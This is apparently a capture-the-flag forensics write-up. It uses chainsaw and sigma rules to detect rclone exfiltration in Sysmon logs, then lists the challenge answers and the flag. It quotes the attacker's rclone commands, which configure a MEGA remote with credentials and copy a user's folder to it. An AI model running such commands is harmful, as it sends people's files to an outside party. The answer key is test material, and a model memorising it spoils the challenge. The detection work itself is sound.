# 1 - Challenge code and description

```
Pandora's friend and partner, Wade, is the one that leads the investigation into the relic's location.
Recently, he noticed some weird traffic coming from his host.
That led him to believe that his host was compromised.
After a quick investigation, his fear was confirmed.
Pandora tries now to see if the attacker caused the suspicious traffic during the exfiltration phase.
Pandora believes that the malicious actor used rclone to exfiltrate Wade's research to the cloud.
Using the tool called "chainsaw" and the sigma rules provided, can you detect the usage of rclone from the event logs produced by Sysmon?
To get the flag, you need to start and connect to the docker service and answer all the questions correctly.
```

We are given some windows event viewer logs and some sigma rules for hunting inside logs\
The challenge description give us some hints to use a tool called `chainsaw` with some custom sigma rules to detect data exfiltiration with `rclone`\
Actually [rclone](https://rclone.org/) is a cli tool for data sync with cloud platforms.

# 2 - Solution

Let's use [chainsaw](https://github.com/WithSecureLabs/chainsaw) and two custom sigma rules `rclone_config_creation.yaml` and `rclone_execution.yaml` to hunt through these windows logs to detect data exfiltiration using `rclone`

```bash
chainsaw hunt Logs/ -s sigma_rules/ --mapping ./chainsaw/mappings/sigma-event-logs-all.yml
# Logs : the windows event viewer directory which is inside challenge files
# sigma_rules : which are two custom sigma rules inside challenge files for discovering rclone config creationg and execution
# mapping : I used chainsaw mapping files
```

And here is the result

```
┌────────────────────────────┬───────┬──────────────────────────┬──────────┬───────────┬────────────────────────────────┐
│         detections         │ count │  Event.System.Provider   │ Event ID │ Record ID │           Event Data           │
├────────────────────────────┼───────┼──────────────────────────┼──────────┼───────────┼────────────────────────────────┤
│ ‣ Rclone Execution via     │ 1     │ Microsoft-Windows-Sysmon │ 1        │ 76        │ ---                            │
│ Command Line or PowerShell │       │                          │          │           │ CommandLine: "\"C:\\Users\\wad │
│                            │       │                          │          │           │ e\\AppData\\Local\\Temp\\rclon │
│                            │       │                          │          │           │ e-v1.61.1-windows-amd64\\rclon │
│                            │       │                          │          │           │ e.exe\" config create remote m │
│                            │       │                          │          │           │ ega user majmeret@protonmail.c │
│                            │       │                          │          │           │ om pass FBMeavdiaFZbWzpMqIVhJC │
│                            │       │                          │          │           │ GXZ5XXZI1qsU3EjhoKQw0rEoQqHyI" │
│                            │       │                          │          │           │ Company: "https://rclone.org"  │
│                            │       │                          │          │           │ CurrentDirectory: "C:\\Users\\ │
│                            │       │                          │          │           │ wade\\AppData\\Local\\Temp\\rc │
│                            │       │                          │          │           │ lone-v1.61.1-windows-amd64\\"  │
│                            │       │                          │          │           │ Description: Rsync for cloud s │
│                            │       │                          │          │           │ torage                         │
│                            │       │                          │          │           │ FileVersion: 1.61.1            │
│                            │       │                          │          │           │ Hashes: SHA256=E94901809FF7CC5 │
│                            │       │                          │          │           │ 168C1E857D4AC9CBB339CA1F6E21DC │
│                            │       │                          │          │           │ CE95DFB8E28DF799961            │
│                            │       │                          │          │           │ Image: "C:\\Users\\wade\\AppDa │
│                            │       │                          │          │           │ ta\\Local\\Temp\\rclone-v1.61. │
│                            │       │                          │          │           │ 1-windows-amd64\\rclone.exe"   │
│                            │       │                          │          │           │ IntegrityLevel: Medium         │
│                            │       │                          │          │           │ LogonGuid: 10DA3E43-D892-63F8- │
│                            │       │                          │          │           │ 4B6D-030000000000              │
│                            │       │                          │          │           │ LogonId: "0x36d4b"             │
│                            │       │                          │          │           │ OriginalFileName: rclone.exe   │
│                            │       │                          │          │           │ ParentCommandLine: "\"C:\\Wind │
│                            │       │                          │          │           │ ows\\System32\\WindowsPowerShe │
│                            │       │                          │          │           │ ll\\v1.0\\powershell.exe\" "   │
│                            │       │                          │          │           │ ParentImage: "C:\\Windows\\Sys │
│                            │       │                          │          │           │ tem32\\WindowsPowerShell\\v1.0 │
│                            │       │                          │          │           │ \\powershell.exe"              │
│                            │       │                          │          │           │ ParentProcessGuid: 10DA3E43-D8 │
│                            │       │                          │          │           │ D2-63F8-9B00-000000000900      │
│                            │       │                          │          │           │ ParentProcessId: 5888          │
│                            │       │                          │          │           │ ParentUser: "DESKTOP-UTDHED2\\ │
│                            │       │                          │          │           │ wade"                          │
│                            │       │                          │          │           │ ProcessGuid: 10DA3E43-D92B-63F │
│                            │       │                          │          │           │ 8-B100-000000000900            │
│                            │       │                          │          │           │ ProcessId: 3820                │
│                            │       │                          │          │           │ Product: Rclone                │
│                            │       │                          │          │           │ RuleName: "-"                  │
│                            │       │                          │          │           │ TerminalSessionId: 1           │
│                            │       │                          │          │           │ User: "DESKTOP-UTDHED2\\wade"  │
│                            │       │                          │          │           │ UtcTime: "2023-02-24 15:35:07. │
│                            │       │                          │          │           │ 336"                           │
├────────────────────────────┼───────┼──────────────────────────┼──────────┼───────────┼────────────────────────────────┤
│ ‣ Rclone Execution via     │ 1     │ Microsoft-Windows-Sysmon │ 1        │ 78        │ ---                            │
│ Command Line or PowerShell │       │                          │          │           │ CommandLine: "\"C:\\Users\\wad │
│                            │       │                          │          │           │ e\\AppData\\Local\\Temp\\rclon │
│                            │       │                          │          │           │ e-v1.61.1-windows-amd64\\rclon │
│                            │       │                          │          │           │ e.exe\" copy C:\\Users\\Wade\\ │
│                            │       │                          │          │           │ Desktop\\Relic_location\\ remo │
│                            │       │                          │          │           │ te:exfiltration -v"            │
│                            │       │                          │          │           │ Company: "https://rclone.org"  │
│                            │       │                          │          │           │ CurrentDirectory: "C:\\Users\\ │
│                            │       │                          │          │           │ wade\\AppData\\Local\\Temp\\rc │
│                            │       │                          │          │           │ lone-v1.61.1-windows-amd64\\"  │
│                            │       │                          │          │           │ Description: Rsync for cloud s │
│                            │       │                          │          │           │ torage                         │
│                            │       │                          │          │           │ FileVersion: 1.61.1            │
│                            │       │                          │          │           │ Hashes: SHA256=E94901809FF7CC5 │
│                            │       │                          │          │           │ 168C1E857D4AC9CBB339CA1F6E21DC │
│                            │       │                          │          │           │ CE95DFB8E28DF799961            │
│                            │       │                          │          │           │ Image: "C:\\Users\\wade\\AppDa │
│                            │       │                          │          │           │ ta\\Local\\Temp\\rclone-v1.61. │
│                            │       │                          │          │           │ 1-windows-amd64\\rclone.exe"   │
│                            │       │                          │          │           │ IntegrityLevel: Medium         │
│                            │       │                          │          │           │ LogonGuid: 10DA3E43-D892-63F8- │
│                            │       │                          │          │           │ 4B6D-030000000000              │
│                            │       │                          │          │           │ LogonId: "0x36d4b"             │
│                            │       │                          │          │           │ OriginalFileName: rclone.exe   │
│                            │       │                          │          │           │ ParentCommandLine: "\"C:\\Wind │
│                            │       │                          │          │           │ ows\\System32\\WindowsPowerShe │
│                            │       │                          │          │           │ ll\\v1.0\\powershell.exe\" "   │
│                            │       │                          │          │           │ ParentImage: "C:\\Windows\\Sys │
│                            │       │                          │          │           │ tem32\\WindowsPowerShell\\v1.0 │
│                            │       │                          │          │           │ \\powershell.exe"              │
│                            │       │                          │          │           │ ParentProcessGuid: 10DA3E43-D8 │
│                            │       │                          │          │           │ D2-63F8-9B00-000000000900      │
│                            │       │                          │          │           │ ParentProcessId: 5888          │
│                            │       │                          │          │           │ ParentUser: "DESKTOP-UTDHED2\\ │
│                            │       │                          │          │           │ wade"                          │
│                            │       │                          │          │           │ ProcessGuid: 10DA3E43-D935-63F │
│                            │       │                          │          │           │ 8-B200-000000000900            │
│                            │       │                          │          │           │ ProcessId: 5116                │
│                            │       │                          │          │           │ Product: Rclone                │
│                            │       │                          │          │           │ RuleName: "-"                  │
│                            │       │                          │          │           │ TerminalSessionId: 1           │
│                            │       │                          │          │           │ User: "DESKTOP-UTDHED2\\wade"  │
│                            │       │                          │          │           │ UtcTime: "2023-02-24 15:35:17. │
│                            │       │                          │          │           │ 516"                           │
└────────────────────────────┴───────┴──────────────────────────┴──────────┴───────────┴────────────────────────────────┘
```

I deleted the `timestamp` and `Computer` column for smaller and brief output\
So here we have the output and executed commands we want

These are the commands executed for data `exfiltiration` with rclone

```cmd
rclone config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI
rclone copy C:\\Users\\Wade\\Desktop\\Relic_location\\ remote:exfiltration -v
```

According to challenge description let's launch instance and answer the questions to get the flag

```bash
What is the email of the attacker used for the exfiltration process? (for example: name@email.com)
> majmeret@protonmail.com
[+] Correct!

What is the password of the attacker used for the exfiltration process? (for example: password123)
> FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI
[+] Correct!

What is the Cloud storage provider used by the attacker? (for example: cloud)
> mega
[+] Correct!

What is the ID of the process used by the attackers to configure their tool? (for example: 1337)
> 3820
[+] Correct!

What is the name of the folder the attacker exfiltrated; provide the full path. (for example: C:\Users\user\folder)
> C:\Users\Wade\Desktop\Relic_location 
[+] Correct!

What is the name of the folder the attacker exfiltrated the files to? (for example: exfil_folder)
> exfiltration
[+] Correct!

[+] Here is the flag: HTB{3v3n_3xtr4t3rr3str14l_B31nGs_us3_Rcl0n3_n0w4d4ys}
```

And here is the flag

```
HTB{3v3n_3xtr4t3rr3str14l_B31nGs_us3_Rcl0n3_n0w4d4ys}
```
